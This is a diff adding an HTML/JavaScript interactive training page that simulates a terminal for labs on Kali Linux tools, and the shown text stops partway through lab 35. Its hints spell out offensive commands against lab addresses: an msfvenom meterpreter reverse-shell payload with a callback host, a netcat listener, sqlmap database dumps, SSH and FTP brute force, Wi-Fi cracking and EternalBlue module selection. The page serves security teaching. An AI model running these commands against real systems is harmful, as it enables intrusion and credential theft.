@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Top 50 Kali Linux Tools: Comprehensive Guide for Security Professionals</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+:root {
+  --bg: #0a0e14; --bg-card: #131920; --bg-term: #080c10; --fg: #c5cdd8; --fg-br: #e8edf3; --fg-dm: #5a6678;
+  --acc: #00ff9c; --acc-dm: rgba(0,255,156,.12); --red: #ff3b5c; --cyan: #00d4ff; --purple: #a855f7; --yellow: #ffd93d;
+  --border: #1e2733; --mono: 'JetBrains Mono', monospace; --sans: 'Inter', system-ui, sans-serif;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: var(--sans); background: var(--bg); color: var(--fg); min-height: 100vh; display: flex; }
+.bg-grid { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(rgba(0,255,156,.025) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,156,.025) 1px, transparent 1px); background-size: 60px 60px; }
+
+.topbar { height: 60px; width: calc(100% - 280px); position: fixed; top: 0; left: 280px; background: var(--bg-card); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; z-index: 100; }
+.topbar h2 { font-size: 1.1rem; color: var(--fg-br); font-weight: 500; }
+.topbar .status { color: var(--acc); font-family: var(--mono); font-size: 0.85rem; display: flex; align-items: center; gap: 8px; }
+.reset-btn { background: var(--bg); border: 1px solid var(--border); color: var(--red); padding: 8px 15px; border-radius: 6px; cursor: pointer; font-weight: 700; transition: 0.2s; }
+.reset-btn:hover { background: rgba(255,59,92,0.1); border-color: var(--red); }
+
+.sidebar { width: 280px; background: #0f1419; border-right: 1px solid var(--border); padding: 0 0 20px 0; overflow-y: auto; height: 100vh; position: fixed; top: 0; left: 0; z-index: 90; }
+.sidebar-title { padding: 20px 20px; font-size: 1rem; font-weight: 800; color: var(--fg-br); border-bottom: 1px solid var(--border); margin-bottom: 15px; line-height: 1.4; background: linear-gradient(90deg, rgba(0,255,156,0.05), transparent); }
+.sidebar-title span { color: var(--acc); }
+.back-btn { display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--bg-card); color: var(--cyan); padding: 12px; margin: 0 15px 20px; border-radius: 8px; text-decoration: none; font-weight: 700; font-size: 0.85rem; border: 1px solid var(--border); transition: 0.2s; }
+.back-btn:hover { border-color: var(--cyan); }
+.cat-label { padding: 15px 20px 5px; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: var(--fg-dm); font-weight: 700; border-top: 1px solid var(--border); }
+.cat-label:first-of-type { border-top: none; }
+.lab-item { padding: 8px 20px 8px 30px; border-left: 3px solid transparent; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 10px; color: var(--fg-dm); font-size: 0.8rem; }
+.lab-item:hover { background: rgba(255,255,255,0.03); color: var(--fg); }
+.lab-item.active { background: var(--acc-dm); border-left-color: var(--acc); color: var(--fg-br); }
+.lab-item.done { color: var(--acc); }
+.lab-item i { width: 16px; text-align: center; font-size: 0.75rem; }
+
+.content { flex: 1; padding: 80px 30px 30px 30px; position: relative; z-index: 1; max-width: 1000px; margin-left: 280px; }
+.header { margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
+.header h1 { font-size: 2.5rem; color: var(--fg-br); margin-bottom: 10px; display: flex; align-items: center; gap: 20px; }
+.header h1 i { color: var(--acc); font-size: 2rem; }
+.header p { color: var(--fg-dm); margin-bottom: 0; line-height: 1.6; font-size: 1.1rem; }
+.card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+.card h3 { color: var(--acc); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; font-size: 1rem; }
+.card ul { list-style: none; padding-left: 5px; }
+.card ul li { margin-bottom: 5px; color: var(--fg); }
+.card ul li::before { content: '▸ '; color: var(--acc); }
+
+.steps { display: flex; gap: 6px; margin-bottom: 20px; flex-wrap: wrap; }
+.step-dot { height: 6px; width: 40px; background: var(--border); border-radius: 3px; transition: 0.3s; }
+.step-dot.active { background: var(--acc); box-shadow: 0 0 8px var(--acc); }
+.step-dot.done { background: var(--acc); opacity: 0.5; }
+
+.term-bar { background: #0d1117; border: 1px solid var(--border); border-bottom: none; border-radius: 10px 10px 0 0; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; }
+.term-dots { display: flex; gap: 6px; }
+.term-dots span { width: 11px; height: 11px; border-radius: 50%; }
+.term-dots span:nth-child(1) { background: #ff5f57; }
+.term-dots span:nth-child(2) { background: #febc2e; }
+.term-dots span:nth-child(3) { background: #28c840; }
+.term-btn { background: var(--bg-card); border: 1px solid var(--border); color: var(--fg-dm); padding: 4px 10px; border-radius: 5px; cursor: pointer; font-size: 0.7rem; font-family: var(--mono); margin-left: 5px; display: inline-flex; align-items: center; gap: 5px; transition: 0.2s; }
+.term-btn:hover { border-color: var(--acc); color: var(--acc); }
+.term-body { background: var(--bg-term); border: 1px solid var(--border); border-top: none; border-radius: 0 0 10px 10px; height: 350px; overflow-y: auto; padding: 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.5; }
+.t-line { white-space: pre-wrap; word-break: break-all; }
+.t-prompt { color: var(--acc); }
+.t-cmd { color: var(--fg-br); }
+.t-out { color: var(--fg-dm); }
+.t-err { color: var(--red); }
+.t-suc { color: var(--acc); }
+.t-step { color: var(--purple); font-weight: 700; }
+.input-line { display: flex; align-items: center; gap: 6px; margin-top: 5px; }
+.input-line input { flex: 1; background: transparent; border: none; outline: none; color: var(--fg-br); font-family: var(--mono); font-size: 0.8rem; caret-color: var(--acc); }
+
+.hint-box { background: var(--bg-card); border: 1px solid var(--border); border-left: 4px solid var(--yellow); border-radius: 10px; padding: 15px; margin-top: 20px; }
+.hint-box strong { color: var(--yellow); display: block; margin-bottom: 5px; }
+.hint-box code { background: var(--bg-term); padding: 3px 6px; border-radius: 4px; color: var(--acc); }
+
+.btn { padding: 12px 24px; border-radius: 8px; background: var(--bg-card); color: var(--fg); border: 1px solid var(--border); cursor: pointer; font-weight: 700; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; transition: 0.2s; font-size: 0.9rem; }
+.btn:hover { border-color: var(--acc); color: var(--acc); }
+.btn.primary { background: var(--acc); color: #000; border: none; }
+.btn.primary:hover { opacity: 0.9; transform: translateY(-2px); }
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+
+<header class="topbar">
+  <h2>Interactive Lab Environment</h2>
+  <div style="display:flex; align-items:center; gap: 20px;">
+    <div class="status"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / 52 Labs</div>
+    <button class="reset-btn" onclick="resetLab()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
+  </div>
+</header>
+
+<aside class="sidebar" id="sidebar"></aside>
+
+<main class="content">
+  <div class="header">
+    <h1 id="labTitle"><i class="fas fa-toolbox"></i> Loading Lab...</h1>
+    <p id="labDesc"></p>
+  </div>
+  
+  <div class="steps" id="steps"></div>
+  
+  <div class="card">
+    <h3><i class="fas fa-bullseye"></i> Objectives</h3>
+    <ul id="objectives"></ul>
+  </div>
+
+  <div class="term-bar">
+    <div class="term-dots"><span></span><span></span><span></span></div>
+    <div>
+      <button class="term-btn" onclick="showSol()"><i class="fas fa-lightbulb"></i> Reveal Solution</button>
+      <button class="term-btn" onclick="clr()"><i class="fas fa-eraser"></i> Clear</button>
+    </div>
+  </div>
+  
+  <div class="term-body" id="term"></div>
+  
+  <div class="hint-box" id="hint"></div>
+  
+  <div style="margin-top: 30px; text-align: right;">
+    <button id="nextBtn" class="btn primary" onclick="nextLab()">Next Lab <i class="fas fa-arrow-right"></i></button>
+  </div>
+</main>
+
+<script>
+const CATS = [
+  { name: "Network Analysis & Scanning", tools: ["Nmap", "Masscan", "Netcat", "Wireshark", "Hping3"] },
+  { name: "Web Application Testing", tools: ["Burp Suite", "OWASP ZAP", "SQLMap", "Nikto", "Dirb"] },
+  { name: "Wireless Security Testing", tools: ["Aircrack-ng", "Reaver", "Wifite"] },
+  { name: "Exploitation Frameworks", tools: ["Metasploit", "BeEF", "SET"] },
+  { name: "Password Cracking", tools: ["John", "Hashcat", "Hydra", "Medusa"] },
+  { name: "Vulnerability Analysis", tools: ["OpenVAS", "Lynis", "Wapiti"] },
+  { name: "Forensics & Info Gathering", tools: ["Maltego", "Recon-ng", "theHarvester", "Dmitry", "Autopsy"] },
+  { name: "Reverse Engineering", tools: ["Ghidra", "Radare2", "GDB"] },
+  { name: "Exploitation Development", tools: ["MSFVenom", "Searchsploit", "Pattern Create"] },
+  { name: "Spoofing & MITM", tools: ["Ettercap", "Bettercap", "Responder"] },
+  { name: "Mobile Security", tools: ["ADB", "MobSF", "Frida"] },
+  { name: "Cryptography & Stego", tools: ["Hashid", "Steghide", "Binwalk"] },
+  { name: "Post-Exploitation", tools: ["Mimikatz", "PowerSploit", "Evil-WinRM"] },
+  { name: "Reporting & Docs", tools: ["Dradis", "Faraday", "CherryTree", "Pipal"] },
+  { name: "Advanced Integration", tools: ["Tool Chaining", "Custom Dev"] }
+];
+
+const LABS = [
+  // 1. Nmap
+  { t:"1. Nmap", d:"Network mapping and service detection.", o:["Run a host discovery scan","Run a version detection scan","Run an aggressive scan"], s:[
+    {i:"First, check if the host is alive without scanning ports.", h:"Use Nmap to perform a ping scan on 10.10.10.5. The flag is <code>-sn</code>. Command: <code>nmap -sn 10.10.10.5</code>", v:c=>/nmap\s+-sn\s+10\.10\.10\.5/i.test(c), o:"Nmap scan report for 10.10.10.5\nHost is up (0.0005s latency).", s:"Host is alive."},
+    {i:"Next, probe open ports to determine the service and version running.", h:"Run a service version detection scan. The flag is <code>-sV</code>. Command: <code>nmap -sV 10.10.10.5</code>", v:c=>/nmap\s+-sV\s+10\.10\.10\.5/i.test(c), o:"PORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.2p2", s:"Versions detected."},
+    {i:"Finally, run an aggressive scan to enable OS detection, version detection, and script scanning.", h:"Use the aggressive flag <code>-A</code> against the target. Command: <code>nmap -A 10.10.10.5</code>", v:c=>/nmap\s+-A\s+10\.10\.10\.5/i.test(c), o:"PORT     STATE SERVICE\n22/tcp   open  ssh\n|_ssh-hostkey: RSA key", s:"Aggressive scan complete."}
+  ]},
+  // 2. Masscan
+  { t:"2. Masscan", d:"Fast port scanning for large networks.", o:["Scan subnet for port 80","Scan top ports"], s:[
+    {i:"Scan port 80 on the entire subnet at high speed.", h:"Use Masscan to scan port 80 on 10.10.10.0/24 with a rate of 1000 packets/sec. Command: <code>masscan -p80 10.10.10.0/24 --rate=1000</code>", v:c=>/masscan\s+-p80\s+10\.10\.10\.0\/24\s+--rate=1000/i.test(c), o:"Discovered open port 80/tcp on 10.10.10.5", s:"Port 80 found."},
+    {i:"Scan the top 10 most common ports on a single host.", h:"Use the <code>--top-ports</code> flag set to 10. Command: <code>masscan --top-ports 10 10.10.10.5</code>", v:c=>/masscan\s+--top-ports\s+10\s+10\.10\.10\.5/i.test(c), o:"Discovered open port 443/tcp on 10.10.10.5", s:"Top ports scan complete."}
+  ]},
+  // 3. Netcat
+  { t:"3. Netcat (nc)", d:"The TCP/IP swiss army knife.", o:["Start a listener","Grab a banner"], s:[
+    {i:"Start a Netcat listener on port 4444 to catch a reverse shell.", h:"Use <code>-l</code> for listen, <code>-v</code> for verbose, <code>-n</code> for no DNS, and <code>-p</code> for port. Command: <code>nc -lvnp 4444</code>", v:c=>/nc\s+-lvnp\s+4444/i.test(c), o:"listening on [any] 4444 ...", s:"Listener started."},
+    {i:"Connect to port 80 on the target to grab the HTTP banner.", h:"Use <code>-v</code> for verbose and connect to IP and port. Command: <code>nc -v 10.10.10.5 80</code>", v:c=>/nc\s+-v\s+10\.10\.10\.5\s+80/i.test(c), o:"Connection to 10.10.10.5 80 port [tcp/http] succeeded!", s:"Banner grabbed."}
+  ]},
+  // 4. Wireshark
+  { t:"4. Wireshark (tshark)", d:"Network protocol analyzer.", o:["Capture traffic","Filter for HTTP"], s:[
+    {i:"Start a capture on eth0 using the CLI version of Wireshark.", h:"Use <code>-i</code> to specify the interface. Command: <code>tshark -i eth0</code>", v:c=>/tshark\s+-i\s+eth0/i.test(c), o:"Capturing on 'eth0'\n1 0.000000 10.0.0.1 -> 10.0.0.2 TCP 60", s:"Capture started."},
+    {i:"Capture traffic and apply a display filter for HTTP traffic only.", h:"Use the <code>-f</code> flag for capture filters. Command: <code>tshark -i eth0 -f \"port 80\"</code>", v:c=>/tshark\s+-i\s+eth0\s+-f\s+["']port\s+80["']/i.test(c), o:"1 0.000000 10.0.0.1 -> 10.0.0.2 HTTP 60 GET /index.html", s:"HTTP filter applied."}
+  ]},
+  // 5. Hping3
+  { t:"5. Hping3", d:"Assemble and analyze TCP/IP packets.", o:["Send SYN packet","Send UDP packet"], s:[
+    {i:"Send a SYN packet to port 80 to see if it's open.", h:"Use <code>-S</code> for SYN, <code>-p</code> for port. Command: <code>hping3 -S 10.10.10.5 -p 80</code>", v:c=>/hping3\s+-S\s+10\.10\.10\.5\s+-p\s+80/i.test(c), o:"HPING 10.10.10.5: S 1 packets transmitted, 1 received", s:"SYN packet sent."},
+    {i:"Send a UDP packet to port 161 (SNMP).", h:"Use <code>--udp</code> and <code>-p</code> for port. Command: <code>hping3 --udp 10.10.10.5 -p 161</code>", v:c=>/hping3\s+--udp\s+10\.10\.10\.5\s+-p\s+161/i.test(c), o:"HPING 10.10.10.5: UDP 1 packets transmitted, 0 received", s:"UDP packet sent."}
+  ]},
+  // 6. Burp Suite
+  { t:"6. Burp Suite", d:"Web vulnerability scanner and proxy.", o:["Launch Burp","Send request via CLI"], s:[
+    {i:"Launch Burp Suite GUI from the terminal.", h:"Run the binary in the background. Command: <code>burpsuite &</code>", v:c=>/^burpsuite\s*&$/i.test(c), o:"Starting Burp Suite Community Edition...", s:"Burp Suite launched."},
+    {i:"Use curl to send traffic through Burp proxy (port 8080).", h:"Use <code>-x</code> to set the proxy. Command: <code>curl -x 127.0.0.1:8080 http://10.10.10.5</code>", v:c=>/curl\s+-x\s+127\.0\.0\.1:8080\s+http:\/\/10\.10\.10\.5/i.test(c), o:"<html><body>Welcome!</body></html>", s:"Traffic routed through proxy."}
+  ]},
+  // 7. OWASP ZAP
+  { t:"7. OWASP ZAP", d:"Web app scanner.", o:["Run quick scan","Run active scan"], s:[
+    {i:"Run a quick scan on a URL via CLI.", h:"Use <code>zap-cli quick-scan</code>. Command: <code>zap-cli quick-scan http://10.10.10.5</code>", v:c=>/zap-cli\s+quick-scan\s+http:\/\/10\.10\.10\.5/i.test(c), o:"[*] Starting scan...\n[+] Scan complete. Found 2 alerts.", s:"Quick scan complete."},
+    {i:"Run an active scan to find deeper vulnerabilities.", h:"Use <code>zap-cli active-scan</code>. Command: <code>zap-cli active-scan http://10.10.10.5</code>", v:c=>/zap-cli\s+active-scan\s+http:\/\/10\.10\.10\.5/i.test(c), o:"[*] Active scan started...", s:"Active scan started."}
+  ]},
+  // 8. SQLMap
+  { t:"8. SQLMap", d:"Automate SQL injection.", o:["Test for SQLi","Dump database"], s:[
+    {i:"Test a URL parameter for SQL injection.", h:"Use <code>-u</code> for URL and <code>--batch</code> to use default options. Command: <code>sqlmap -u \"http://10.10.10.5/page?id=1\" --batch</code>", v:c=>/sqlmap\s+-u\s+.*http:\/\/10\.10\.10\.5/i.test(c), o:"[+] Parameter 'id' is vulnerable. SQLi confirmed!", s:"SQLi found."},
+    {i:"Dump the database tables for the vulnerable parameter.", h:"Use <code>--dump</code>. Command: <code>sqlmap -u \"http://10.10.10.5/page?id=1\" --dump --batch</code>", v:c=>/sqlmap\s+-u\s+.*--dump/i.test(c), o:"+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n| 1  | admin    | admin123   |", s:"Database dumped."}
+  ]},
+  // 9. Nikto
+  { t:"9. Nikto", d:"Web server scanner.", o:["Run basic scan","Run with tuning"], s:[
+    {i:"Run a basic web server scan.", h:"Use <code>-h</code> for host. Command: <code>nikto -h http://10.10.10.5</code>", v:c=>/nikto\s+-h\s+http:\/\/10\.10\.10\.5/i.test(c), o:"+ OSVDB-3092: /admin/: Admin folder found.", s:"Basic scan complete."},
+    {i:"Run scan tuning specifically for SQL Injection.", h:"Use <code>-Tuning</code> and the code 9 for SQLi. Command: <code>nikto -h http://10.10.10.5 -Tuning 9</code>", v:c=>/nikto\s+-h\s+http:\/\/10\.10\.10\.5\s+-Tuning\s+9/i.test(c), o:"[*] Tuning set to SQL Injection", s:"Tuning scan complete."}
+  ]},
+  // 10. Dirb
+  { t:"10. Dirb", d:"Directory brute-forcer.", o:["Run default list","Run custom extensions"], s:[
+    {i:"Brute-force directories with the default wordlist.", h:"Simply provide the URL. Command: <code>dirb http://10.10.10.5</code>", v:c=>/dirb\s+http:\/\/10\.10\.10\.5/i.test(c), o:"==> DIRECTORY: http://10.10.10.5/admin/", s:"Directories found."},
+    {i:"Scan for specific file extensions like .php and .html.", h:"Use <code>-X</code> to append extensions. Command: <code>dirb http://10.10.10.5 -X .php,.html</code>", v:c=>/dirb\s+http:\/\/10\.10\.10\.5\s+-X\s+\.php,\.html/i.test(c), o:"==> DIRECTORY: http://10.10.10.5/login.php", s:"Extensions scan complete."}
+  ]},
+  // 11. Aircrack-ng
+  { t:"11. Aircrack-ng", d:"Wi-Fi WPA/WEP cracker.", o:["Enable monitor mode","Capture handshake","Crack handshake"], s:[
+    {i:"Enable monitor mode on your wireless adapter.", h:"Use <code>airmon-ng start</code>. Command: <code>airmon-ng start wlan0</code>", v:c=>/airmon-ng\s+start\s+wlan0/i.test(c), o:"mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon", s:"Monitor mode enabled."},
+    {i:"Capture the 4-way handshake for a specific BSSID.", h:"Use <code>airodump-ng</code> with <code>-c</code> for channel and <code>--bssid</code>. Command: <code>airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w cap wlan0mon</code>", v:c=>/airodump-ng\s+.*--bssid\s+00:11:22:33:44:55/i.test(c), o:"[!] WPA handshake: 00:11:22:33:44:55 captured!", s:"Handshake captured."},
+    {i:"Crack the captured handshake using a wordlist.", h:"Use <code>aircrack-ng</code> with <code>-w</code> for wordlist. Command: <code>aircrack-ng -w rockyou.txt cap-01.cap</code>", v:c=>/aircrack-ng\s+-w\s+rockyou\.txt\s+cap-01\.cap/i.test(c), o:"[*] KEY FOUND! [ password123 ]", s:"Wi-Fi cracked."}
+  ]},
+  // 12. Reaver
+  { t:"12. Reaver", d:"WPS brute-force.", o:["Run WPS attack"], s:[
+    {i:"Run a standard WPS attack against an AP.", h:"Use <code>-i</code> for interface, <code>-b</code> for BSSID, <code>-vv</code> for verbose. Command: <code>reaver -i wlan0mon -b 00:11:22:33:44:55 -vv</code>", v:c=>/reaver\s+-i\s+wlan0mon\s+-b\s+00:11:22:33:44:55/i.test(c), o:"[+] WPS pin: 12345670", s:"WPS pin found."}
+  ]},
+  // 13. Wifite
+  { t:"13. Wifite", d:"Automated wireless auditing.", o:["Launch Wifite"], s:[
+    {i:"Launch Wifite to automatically scan and attack nearby WPA networks.", h:"Simply run the tool. Command: <code>wifite</code>", v:c=>/^wifite$/i.test(c), o:"[*] Scanning for wireless networks...", s:"Wifite started."}
+  ]},
+  // 14. Metasploit
+  { t:"14. Metasploit", d:"Exploitation framework.", o:["Launch console","Search exploit","Configure exploit"], s:[
+    {i:"Start the Metasploit Framework console.", h:"Run the command. Command: <code>msfconsole</code>", v:c=>/^msfconsole$/i.test(c), o:"       =[ metasploit v6.3.36-dev ]\nmsf6 >", s:"Metasploit launched."},
+    {i:"Search for an exploit related to MS17-010 (EternalBlue).", h:"Use the <code>search</code> command. Command: <code>search ms17_010</code>", v:c=>/^search\s+ms17_010$/i.test(c), o:"   0  exploit/windows/smb/ms17_010_eternalblue", s:"Exploit found."},
+    {i:"Select the exploit module to use.", h:"Use the <code>use</code> command. Command: <code>use exploit/windows/smb/ms17_010_eternalblue</code>", v:c=>/^use\s+exploit\/windows\/smb\/ms17_010_eternalblue$/i.test(c), o:"[*] Using exploit/windows/smb/ms17_010_eternalblue", s:"Module selected."}
+  ]},
+  // 15. BeEF
+  { t:"15. BeEF", d:"Browser Exploitation Framework.", o:["Start BeEF"], s:[
+    {i:"Start the BeEF server to hook browsers.", h:"Run the execution script. Command: <code>./beef</code>", v:c=>/^\.\/beef$/i.test(c), o:"[*] BeEF starting...\n[+] Hook URL: http://10.10.10.10:3000/hook.js", s:"BeEF started."}
+  ]},
+  // 16. SET
+  { t:"16. SET", d:"Social Engineering Toolkit.", o:["Launch SET"], s:[
+    {i:"Launch the Social Engineering Toolkit menu.", h:"Run the command. Command: <code>setoolkit</code>", v:c=>/^setoolkit$/i.test(c), o:"[*] Social-Engineer Toolkit starting...\n1) Social-Engineering Attacks", s:"SET launched."}
+  ]},
+  // 17. John
+  { t:"17. John", d:"Offline password cracker.", o:["Crack hashes","Show cracked"], s:[
+    {i:"Crack a file containing password hashes using a wordlist.", h:"Use <code>--wordlist</code> to specify the dictionary. Command: <code>john --wordlist=rockyou.txt hashes.txt</code>", v:c=>/john\s+--wordlist=rockyou\.txt\s+hashes\.txt/i.test(c), o:"Password1         (admin)\n1g 0:00:00:12 DONE", s:"Hash cracked."},
+    {i:"Display the passwords that were successfully cracked.", h:"Use the <code>--show</code> flag. Command: <code>john --show hashes.txt</code>", v:c=>/john\s+--show\s+hashes\.txt/i.test(c), o:"admin:Password1", s:"Passwords displayed."}
+  ]},
+  // 18. Hashcat
+  { t:"18. Hashcat", d:"GPU-accelerated password cracker.", o:["Crack NTLM","Show cracked"], s:[
+    {i:"Crack an NTLM hash (Hash mode 1000) using a wordlist.", h:"Use <code>-m</code> for hash type and <code>-a</code> for attack mode (0 is dictionary). Command: <code>hashcat -m 1000 -a 0 hash.txt rockyou.txt</code>", v:c=>/hashcat\s+-m\s+1000\s+-a\s+0\s+hash\.txt\s+rockyou\.txt/i.test(c), o:"Status...........: Cracked", s:"Hash cracked."},
+    {i:"Show the cracked password from the hash file.", h:"Use <code>--show</code>. Command: <code>hashcat -m 1000 hash.txt --show</code>", v:c=>/hashcat\s+-m\s+1000\s+hash\.txt\s+--show/i.test(c), o:"31d6cfe0d16ae931b73c59d7e0c089c0:Password1", s:"Password displayed."}
+  ]},
+  // 19. Hydra
+  { t:"19. Hydra", d:"Online password cracker.", o:["Brute force SSH"], s:[
+    {i:"Brute force SSH for user 'admin' using a wordlist.", h:"Use <code>-l</code> for username, <code>-P</code> for password list. Command: <code>hydra -l admin -P rockyou.txt ssh://10.10.10.5</code>", v:c=>/hydra\s+-l\s+admin\s+-P\s+rockyou\.txt\s+ssh:\/\/10\.10\.10\.5/i.test(c), o:"[22][ssh] password: letmein123", s:"SSH password found."}
+  ]},
+  // 20. Medusa
+  { t:"20. Medusa", d:"Parallel online brute force.", o:["Brute force FTP"], s:[
+    {i:"Brute force FTP for user 'admin'.", h:"Use <code>-h</code> for host, <code>-u</code> for user, <code>-P</code> for list, <code>-M</code> for module. Command: <code>medusa -h 10.10.10.5 -u admin -P rockyou.txt -M ftp</code>", v:c=>/medusa\s+-h\s+10\.10\.10\.5\s+-u\s+admin\s+-P\s+rockyou\.txt\s+-M\s+ftp/i.test(c), o:"ACCOUNT FOUND: [ftp] Host: 10.10.10.5 User: admin Pass: admin123", s:"FTP password found."}
+  ]},
+  // 21. OpenVAS
+  { t:"21. OpenVAS", d:"Vulnerability scanner.", o:["Start OpenVAS"], s:[
+    {i:"Start the OpenVAS/Greenbone Vulnerability Manager scanner.", h:"Run the start command. Command: <code>gvm-start</code>", v:c=>/^gvm-start$/i.test(c), o:"[*] Please wait, starting OpenVAS Scanner...", s:"OpenVAS started."}
+  ]},
+  // 22. Lynis
+  { t:"22. Lynis", d:"Linux auditing tool.", o:["Run audit"], s:[
+    {i:"Run a local system security audit.", h:"Use <code>audit system</code>. Command: <code>lynis audit system</code>", v:c=>/lynis\s+audit\s+system/i.test(c), o:"[+] Hardening index : 65/100", s:"System audit complete."}
+  ]},
+  // 23. Wapiti
+  { t:"23. Wapiti", d:"Web app vulnerability scanner.", o:["Run scan"], s:[
+    {i:"Scan a web app for vulnerabilities like SQLi and XSS.", h:"Provide the URL directly. Command: <code>wapiti http://10.10.10.5</code>", v:c=>/^wapiti\s+http:\/\/10\.10\.10\.5$/i.test(c), o:"[+] Found SQL Injection in /login.php", s:"Wapiti scan complete."}
+  ]},
+  // 24. Maltego
+  { t:"24. Maltego", d:"Graphical OSINT tool.", o:["Launch Maltego"], s:[
+    {i:"Launch Maltego CE (Community Edition) GUI.", h:"Run the binary. Command: <code>maltego</code>", v:c=>/^maltego$/i.test(c), o:"Starting Maltego Community Edition...", s:"Maltego launched."}
+  ]},
+  // 25. Recon-ng
+  { t:"25. Recon-ng", d:"OSINT web reconnaissance framework.", o:["Start console"], s:[
+    {i:"Launch the recon-ng interactive console.", h:"Run the command. Command: <code>recon-ng</code>", v:c=>/^recon-ng$/i.test(c), o:"[*] recon-ng v5.1.2 starting...", s:"Recon-ng started."}
+  ]},
+  // 26. theHarvester
+  { t:"26. theHarvester", d:"Gather emails and subdomains.", o:["Harvest emails"], s:[
+    {i:"Harvest emails and subdomains for target.com using Google.", h:"Use <code>-d</code> for domain and <code>-b</code> for data source. Command: <code>theHarvester -d target.com -b google</code>", v:c=>/theHarvester\s+-d\s+target\.com\s+-b\s+google/i.test(c), o:"[*] Emails found:\nadmin@target.com", s:"Emails harvested."}
+  ]},
+  // 27. Dmitry
+  { t:"27. Dmitry", d:"Deepmagic Information Gathering Tool.", o:["TCP port scan"], s:[
+    {i:"Perform a TCP port scan on the target.", h:"Use <code>-p</code> for TCP port scan. Command: <code>dmitry -p 10.10.10.5</code>", v:c=>/dmitry\s+-p\s+10\.10\.10\.5/i.test(c), o:"Host 10.10.10.5 ports: 22, 80, 443", s:"Port scan complete."}
+  ]},
+  // 28. Autopsy
+  { t:"28. Autopsy", d:"Digital forensics platform.", o:["Launch Autopsy"], s:[
+    {i:"Launch the Autopsy forensic GUI in the background.", h:"Run the command with <code>&</code>. Command: <code>autopsy &</code>", v:c=>/^autopsy\s*&$/i.test(c), o:"Starting Autopsy on port 9999...", s:"Autopsy started."}
+  ]},
+  // 29. Ghidra
+  { t:"29. Ghidra", d:"Reverse engineering suite.", o:["Launch Ghidra"], s:[
+    {i:"Launch the Ghidra reverse engineering suite.", h:"Run the execution script. Command: <code>ghidraRun &</code>", v:c=>/^ghidraRun\s*&$/i.test(c), o:"Starting Ghidra...", s:"Ghidra launched."}
+  ]},
+  // 30. Radare2
+  { t:"30. Radare2", d:"Reverse engineering framework.", o:["Open binary","Analyze binary"], s:[
+    {i:"Open a binary in radare2.", h:"Run <code>r2</code> and provide the file. Command: <code>r2 binary.exe</code>", v:c=>/^r2\s+binary\.exe$/i.test(c), o:"[0x00401000]> ", s:"Binary loaded."},
+    {i:"Analyze the binary automatically.", h:"Type the analyze command inside the prompt. Command: <code>aaa</code>", v:c=>/^aaa$/i.test(c.trim()), o:"[*] Analyze complete.", s:"Binary analyzed."}
+  ]},
+  // 31. GDB
+  { t:"31. GDB", d:"GNU Debugger.", o:["Load binary"], s:[
+    {i:"Load a binary into the GNU Debugger.", h:"Run <code>gdb</code> and provide the file. Command: <code>gdb ./binary</code>", v:c=>/gdb\s+\.\/binary/i.test(c), o:"Reading symbols from ./binary...", s:"GDB loaded binary."}
+  ]},
+  // 32. MSFVenom
+  { t:"32. MSFVenom", d:"Generate payloads.", o:["Generate Windows EXE"], s:[
+    {i:"Generate a Windows reverse shell payload.", h:"Use <code>-p</code> for payload, <code>LHOST</code>/<code>LPORT</code> for callback, <code>-f</code> for format. Command: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe</code>", v:c=>/msfvenom\s+-p\s+windows\/meterpreter\/reverse_tcp\s+LHOST=10\.10\.10\.10\s+LPORT=4444\s+-f\s+exe\s+-o\s+shell\.exe/i.test(c), o:"Payload size: 73802 bytes\nSaved as: shell.exe", s:"EXE payload generated."}
+  ]},
+  // 33. Searchsploit
+  { t:"33. Searchsploit", d:"Search Exploit-DB.", o:["Search exploits"], s:[
+    {i:"Search for exploits related to Apache 2.4.18.", h:"Run <code>searchsploit</code> with the search term. Command: <code>searchsploit apache 2.4.18</code>", v:c=>/searchsploit\s+apache\s+2\.4\.18/i.test(c), o:"Exploit Title | Path\nApache 2.4.18 - DoS | /linux/dos/40809.txt", s:"Exploits found."}
+  ]},
+  // 34. Pattern Create
+  { t:"34. Pattern Create", d:"Find buffer overflow offsets.", o:["Create pattern"], s:[
+    {i:"Generate a unique pattern to find the EIP offset.", h:"Use <code>msf-pattern_create</code> with <code>-l</code> for length. Command: <code>msf-pattern_create -l 2000</code>", v:c=>/msf-pattern_create\s+-l\s+2000/i.test(c), o:"Aa0Aa1Aa2Aa3Aa4Aa5Aa...", s:"Pattern created."}
+  ]},
+  // 35. Ettercap
+  { t:"35. Ettercap", d:"Man-in-the-middle attacks.", o:["Run ARP poisoning"], s:[
